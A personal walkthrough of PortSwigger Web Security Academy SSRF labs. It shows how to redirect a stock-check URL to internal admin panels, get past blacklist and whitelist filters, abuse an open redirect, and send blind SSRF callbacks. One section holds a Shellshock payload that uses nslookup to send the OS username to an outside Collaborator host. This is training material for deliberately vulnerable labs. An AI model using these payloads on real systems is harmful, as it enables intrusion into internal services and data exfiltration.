# Portswigger
## Server-Side Request Forgery (SSRF)
### Basic SSRF against the local server
```bash

#### This lab has a stock check feature which fetches data from an internal system.

#### To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos. 

Go to: "View details" for any item
Intercept is on
Click "Check stock"
Send to repeater
Replace:

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D2

With

stockApi=http://localhost/

Response:

HTTP/1.1 302 Found

Go to this page
Delete the username "carlos"
Upon fail find the request in the HTTP history

GET /admin/delete?username=carlos HTTP/1.1

Go back to the POST request in repeater with the API end-point

POST /product/stock HTTP/1.1

Add:

/admin/delete?username=carlos

To the previous end-point:

stockApi=http://localhost/admin/delete?username=carlos

Note the response:

HTTP/1.1 302 Found

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220514212713.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220514212825.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220514213602.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220514213639.png)

### Basic SSRF against another back-end system
```bash

#### This lab has a stock check feature which fetches data from an internal system.

#### To solve the lab, use the stock check functionality to scan the internal 192.168.0.X range for an admin interface on port 8080, then use it to delete the user carlos. 

Go to: "View details"
Intercept is on
Click "Check stock"
Send to repeater
Note the end-point being URL-encoded (Decode the URL-encode by using Ctrl+U when selected and visa versa)
Change:

http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1

To

http%3A%2F%2F192.168.0.1%3A8080%2Fadmin

Response:

HTTP/1.1 400 Bad Request

"Missing parameter"

Send to intruder

stockApi=http%3A%2F%2F192.168.0.§1§%3A8080%2Fadmin

Go to: Payloads
Payload type: Numbers
Payload Options[Numbers]
From: 1
To: 255
Step: 1

Note that payload number "36" has a status code of "200"

Go back to repeater and change:

stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fadmin

To:

stockApi=http%3A%2F%2F192.168.0.36%3A8080%2Fadmin

Response:

HTTP/1.1 200 OK

Go to this end-point in the browser
Request to delete username "carlos"
Upon failure go to: HTTP history
Find end-point:

GET /http://192.168.0.36:8080/admin/delete?username=carlos HTTP/1.

Copy:

/delete?username=carlos

Go back to repeater and add on the above content and ensure it is URL-encoded (Did not test w/out URL-encode, but it most likely should work the same)

stockApi=http%3A%2F%2F192.168.0.36%3A8080%2Fadmin%2Fdelete%3fusername%3dcarlos

Response:

HTTP/1.1 302 Found

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220514230225.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220514230443.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220514230334.png)


![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220514225825.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220514225806.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220514231108.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220514231201.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220514231230.png)

### SSRF with blacklist-based input filter
```bash

#### This lab has a stock check feature which fetches data from an internal system.

#### To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

#### The developer has deployed two weak anti-SSRF defenses that you will need to bypass. 

Go to: "View details"
Intercept is on
Click "Check stock"
Send to repeater
Note the end-point being URL-encoded (Decode the URL-encode by using Ctrl+U when selected and visa versa)
Change:

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1

To

http:/localhost

Note the response:

HTTP/1.1 400 Bad Request

"External stock check blocked for security reasons"

This validates there is something behind this end-point

After trying:

http://localhost/
http://127.0.0.1/
http://127.1./
And many more

Try:

stockApi=http://loCalhost

Response:

HTTP/1.1 200 OK

Try:

stockApi=http://loCalhost/admin

Response:

HTTP/1.1 400 Bad Request

"External stock check blocked for security reasons"

Try:

stockApi=http://loCalhost/adMin

Response:

HTTP/1.1 200 OK

Right-click on the response and go to: "show response in browser"
Delete the username "carlos"
Upon failure go to: HTTP history
Find:

GET /admin/delete?username=carlos HTTP/1.1

Copy:

/delete?username=carlos

Change:

stockApi=http://loCalhost/adMin

To

stockApi=http://loCalhost/adMin/delete?username=carlos

Note the response:

HTTP/1.1 302 Found

```


![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220515001944.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220515002152.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220515002215.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220515002247.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220515002322.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220515002438.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220515002514.png)

### SSRF with whitelist-based input filter
```bash

#### This lab has a stock check feature which fetches data from an internal system.

#### To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.

#### The developer has deployed an anti-SSRF defense you will need to bypass. 

#### "You can embed credentials in a URL before the hostname, using the @ character. For example:""
"https://expected-host@evil-host"

#### "You can use the # character to indicate a URL fragment. For example:""
"https://evil-host#expected-host"

#### "You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example:"
"https://expected-host.evil-host"

#### "You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded" # "characters differently than the code that performs the back-end HTTP request."

Go to: "View detials"
Intercept is on
Click "Check stock"
Send to repeater
Change:

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1

To

stockApi=http://localhost

Note the response:

HTTP/1.1 400 Bad Request

"External stock check host must be stock.weliketoshop.net"

Try:

stockApi=http://localhost@stock.weliketoshop.net

Response:

HTTP/1.1 500 Internal Server Error

Try:

stockApi=http://localhost#@stock.weliketoshop.net

Or

stockApi=http://localhost#stock.weliketoshop.net

Or

stockApi=http://localhost#@stock.weliketoshop.net

Or

stockApi=http://localhost%23@stock.weliketoshop.net

Response:

HTTP/1.1 400 Bad Request

Try:

stockApi=http://localhost%25%32%33@stock.weliketoshop.net

Response:

HTTP/1.1 200 OK

Success with double URL-encoding the # symbol

Go to:

stockApi=http://localhost%25%32%33@stock.weliketoshop.net/admin

Right-Click the "200" response
Click "Show response in browser"
Delete the username "carlos"
Upon failure
Go to: HTTP history

GET /admin/delete?username=carlos HTTP/1.1

Copy:

/delete?username=carlos

Go to repeater

Change:

stockApi=http://localhost%25%32%33@stock.weliketoshop.net/admin

To

stockApi=http://localhost%25%32%33@stock.weliketoshop.net/admin/delete?username=carlos

Response:

HTTP/1.1 302 Found

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220515211806.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220515212010.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220515211840.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220515212034.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220515212132.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220515212152.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220515212327.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220515212411.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220515212448.png)

### SSRF with filter bypass via open redirection vulnerability
```bash

####  This lab has a stock check feature which fetches data from an internal system.

#### To solve the lab, change the stock check URL to access the admin interface at http://192.168.0.12:8080/admin and delete the user carlos.

#### The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first. 

Go to: "View detials"
Intercept is on
Click "Check stock"
Send to repeater
Change:

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1

To

stockApi=http://localhost

Note the response:

HTTP/1.1 400 Bad Request

"External stock check host must be stock.weliketoshop.net"

Try:

stockApi=http://192.168.0.12:8080/admin

Response:

HTTP/1.1 400 Bad Request

"External stock check host must be stock.weliketoshop.net"

At the bottom right of the page where you click "Check stock" note the "Return to list" and "next product" options
This is at end-point:

https://acb11f9c1fbfb4c9c04c2cc900970050.web-security-academy.net/product?productId=2

Go to: HTTP history
Find:

GET /product/nextProduct?currentProductId=2&path=/product?productId=3 HTTP/1.1

Go to repeater
Change:

stockApi=http://192.168.0.12:8080/admin

To

stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin

Response:

HTTP/1.1 200 OK

Right-Click the "200" response
Click "Show response in browser"
Delete the username "carlos"
Upon failure
Go to: HTTP history

GET /http://192.168.0.12:8080/admin/delete?username=carlos HTTP/1.1

Copy:

/delete?username=carlos

Go to repeater
Change:

stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin

To

stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos

Response:

HTTP/1.1 200 OK

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220515215321.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220515215356.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220515215433.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220515215517.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220515215552.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220515212610.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220515212638.png)

### Blind SSRF with out-of-band detection
```bash

#### This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.

#### To solve the lab, use this functionality to cause an HTTP request to the public Burp Collaborator server. 

Click on "View details"
Go to: HTTP history

GET /product?productId=2 HTTP/1.1

Send to repeater
Go to: Burp -> Burp Collaborator client -> Copy to clipboard
Change:

Referer: https://ac1a1f801f0cf41bc09ed40100220056.web-security-academy.net/

To

Referer: https://1bdsgc3rzpeu018hgzs4dl3xxo3er3.oastify.com/

Response:

HTTP/1.1 200 OK

Go to Burp Collaborator client
Click "Poll now"

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220516013314.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220516013400.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220516013426.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220516013446.png)

### Blind SSRF with Shellshock exploitation
```bash

#### This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.

#### To solve the lab, use this functionality to perform a blind SSRF attack against an internal server in the 192.168.0.X range on port 8080. In the blind attack, use a Shellshock payload against the internal server to exfiltrate the name of the OS user. 

Go to BApp store and install "Burp Collaborator Everywhere" if not already installed
Browse the site to at least two various end-points
Go to: Target -> Site map -> Issues
Note the 'Collaborator Pingback' issues
Go to: HTTP history
Find:

GET /product?productId=2 HTTP/1.1

Send to intruder
Change:

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0

To

() { :;}; /usr/bin/nslookup $(whoami).grb7zk1469fm5yaq4vykqnxp2g86wv.oastify.com

Change:

Referer: https://ac5c1fc41fb61481c09d137300240001.web-security-academy.net/

To

Referer: http://192.168.0.§1§:8080

Go to: Payloads
Payload type: Numbers
Payload Options[Numbers]
From: 1
To: 255
Step: 1
Start attack
Go to: Burl Collaborator client
Click "Poll now"

**peter-DaumjH**

Further reading:
https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface#remoteclient

```

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220516021014.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220516021510.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220516021543.png)

![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220516021833.png)

#hacking
